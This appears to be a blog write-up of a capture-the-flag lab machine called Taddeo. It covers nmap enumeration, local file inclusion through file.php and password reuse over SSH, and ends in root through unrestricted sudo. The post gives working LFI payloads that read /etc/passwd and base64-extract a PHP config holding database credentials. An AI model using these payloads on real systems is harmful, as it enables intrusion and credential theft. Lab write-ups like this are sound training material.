---
title: Practical Pentest Labs | Taddeo
date: 2018-07-03 00:00:00 +0000
layout: post
categories: []
image:
  feature: "/968f7dbcabcd64f453a6ece147eda193.jpg"
  credit: ''
  creditlink: ''
description: ''
---
This post will describe exploitation of the Taddeo device on [PracticalPenTestLabs](https://practicalpentestlabs.com/).

## Enumeration

As is tradition, we run a full nmap scan:

```bash
nmap -Pn -p22,80,3128 -A 10.0.3.10
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-03 21:30 EDT
Nmap scan report for 10.0.3.10
Host is up (0.094s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f9:4c:ee:5c:41:f0:29:4f:95:7f:6a:c4:ed:84:ab:b3 (DSA)
|   2048 b5:93:28:83:45:8e:7e:b5:74:55:14:4c:41:c3:0a:11 (RSA)
|   256 a1:91:d7:28:ae:16:66:6f:24:36:d1:f3:3d:74:46:e6 (ECDSA)
|_  256 03:2a:6e:17:65:a9:d6:4a:10:c7:91:ca:5d:fd:39:17 (ED25519)
80/tcp   open  http       Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 230   2016-06-21 20:25  config.php
| 115   2016-06-23 19:29  file.php
| 20    2016-06-14 10:38  phpinfo.php
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
3128/tcp open  http-proxy Squid http proxy 3.3.8
|_http-server-header: squid/3.3.8
|_http-title: ERROR: The requested URL could not be retrieved
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.16
OS details: Linux 3.16
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   95.01 ms 10.10.0.1
2   95.25 ms 10.0.3.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.15 seconds
```

So immediately we get a few ports we can browse. Based on what we know about this CTF network. More than likely our shell will be from the HTTP. Because we used the "-A" flag. Nmap enumerated the HTTP website and gathered some additional information that can help us prepare a plan of attack.

![](/assets/img/Screenshot from 2018-07-03 21-35-20.jpg)

On the HTTP landing page, we are greeted with a directory listing. Within this listing we have a few options: phpinfo.php; config.php & file.php

![](/Screenshot from 2018-07-03 21-37-05.jpg)

Phpinfo.php gives us additional information on the target machine. But nothing else was gained from this page. Config.php was blank. It is possible there is content in this file but we can read the contents.

![](/Screenshot from 2018-07-03 21-39-07.jpg)

File.php is interesting however, when we visit this page. We are greeted by a comment that says " Please specify the 'name' parameter" Okay. So if we visit "http://10.0.3.10/file.php?name=" We more than likely will get LFI.

![](/Screenshot from 2018-07-03 21-43-26.jpg)

And Lo and Behold we get /etc/passwd by visiting http://10.0.3.10/file.php?name=/////////////////etc/passwd. Great, so now we have a user on the machine name Taddeo. We'll need this later for SSH. Now that we know we can read system files, let's see what's inside the Config.php.

![](/Screenshot from 2018-07-03 21-43-21.jpg)

By using the PHP filters we can prevent PHP code executing when used in Local File Inclusion. So we visit "http://10.0.3.10/file.php?name=php://filter/convert.base64-encode/resource=config.php" Returned is a base64 encoded string. We will need to decode this before getting the contents of the php config file. We can do this in the command line by executing:

```bash 
echo "PD9waHAKZGVmaW5lKCAnREJfTkFNRScsICd0ZXN0JyApOwoKLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovCmRlZmluZSggJ0RCX1VTRVInLCAndGFkZGVvJyApOwoKLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovCmRlZmluZSggJ0RCX1BBU1NXT1JEJywgJ3RhZGRlb0AzMjEnICk7CgovKiogTXlTUUwgaG9zdG5hbWUgKi8KZGVmaW5lKCAnREJfSE9TVCcsICdsb2NhbGhvc3QnICk7Cgo/Pgo=" | base64 -d 
```

![](/Screenshot from 2018-07-03 21-44-14.jpg)

Once executed we will get the contents which gives us a password. Although this is a password used in MySQL. It is very common for users to re-use passwords. So let's try this out on the SSH port 22 with the user Taddeo.

![](/Screenshot from 2018-07-03 21-51-37.jpg)

We have a shell! Awesome, but the job isn't over yet. We will need to get root access now. We fire up LinuxPrivChecker.py annnnd. Nothing, nothing interesting. Which is fine because we have a few other tricks up our sleeves before we really start digging deep. But you should always try the quick and dirty tricks first before spending a ridiculous amount of time trying to get root shell. Most times, the answer is right in front of you. Now this version is vulnerable to DirtyCow. However, DirtyCow is also Dirty and more often than not will crash these machines. So best not to use it. What we do have however is a nice prompt when we execute:

```bash
Sudo -l
```

What it reads is:

```bash
User taddeo may run the following commands on TADDEO:

    (ALL) NOPASSWD: ALL
```

![](/Screenshot from 2018-07-03 21-55-46.jpg)

This is good. So we can run programs as sudo without using a password. So let's execute:

```bash
Sudo -s
```

and see if we can get a root shell.

Tadaa! We have root and our flag.

![](/Screenshot from 2018-07-03 21-56-50.jpg)